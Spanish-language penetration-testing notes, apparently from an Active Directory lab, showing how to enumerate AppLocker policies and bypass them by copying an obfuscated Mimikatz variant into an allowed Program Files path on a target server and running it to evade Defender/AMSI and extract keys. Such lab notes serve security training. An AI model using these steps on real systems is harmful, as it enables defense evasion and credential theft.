# Applocker 

Tags: #AppLocker #TheKatEx  

Donde: 
	- Estas en una shell: ConstrainedLanguage (Este tipo de shell no te permite ejecutar capacidades avanzadas ej: Mimikatz, Safetykatz)
	- La shell tiene habilitado Applocker

```powershell 
❯ Enter-PSSession dcorp-adminsrv                  # Conectarse obteniendo un Powershell 
❯ $ExecutionContext.SessionState.LanguageMode     # Qué tan restringido esta Powershell 
```

```powershell 
❯ reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2     # Verificar si Applocker esta configurado 

	# HKLM\Software\Policies\Microsoft\Windows\SRPV2   -->   Ruta donde applocker guarda sus políticas  
	# Si esta configurado muestra lo siguiente: 
		- Appx
		- Dll
		- Exe
		- Msi
		- Script 
```

```powershell 
❯ reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script   # Mirar las reglas de applocker 
❯ reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d  # Leer una regla para buscar si existe una ruta en donde tenga una regla ALLOW donde puedes ejecutar un script sin bloqueo 


	HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
    Value    REG_SZ    <FilePathRule Id="06dce67b-934c-454f-a263-2515c8796a5d" Name="(Default Rule) All scripts located in the Program Files folder" Description="Allows members of the Everyone group to run scripts that are located in the Program Files folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>
```

```powershell 
❯ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections   # Obtener la política AppLocker que realmente está activa

[snip]
PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
Name                : (Default Rule) All scripts located in the Program Files folder
Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c
Name                : (Default Rule) All scripts located in the Windows folder
Description         : Allows members of the Everyone group to run scripts that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow
```

## TheKatEx

TheKatEx se utiliza porque, aunque AppLocker permite ejecutar scripts desde rutas confiables como Program Files, PowerShell sigue funcionando en ConstrainedLanguage Mode, lo que rompe técnicas ofensivas comunes como dot sourcing, reflection y ciertas cargas dinámicas de tooling. Por ello, se modifica el script original para que se autoejecute al cargarse, además de ofuscar comandos sensibles de Mimikatz/TheKat para reducir detección por Defender/AMSI y aprovechar una ruta explícitamente permitida por AppLocker.

```powershell 
# Esto se puede hacer porque el usuario que se tiene tiene acceso administrativo en el server 
❯ Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-stdx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'  
# Ejecutar desde la máquina de atacante 
# Copiar el archivo al server víctima en la ruta donde se pueden ejecutar los scripts
```

```powershell 
❯ cd C:\Program Files
❯ ls 
❯ .\Invoke-TheKatEx-keys-stdX.ps1   # Lo ejecutamos en el server víctima
```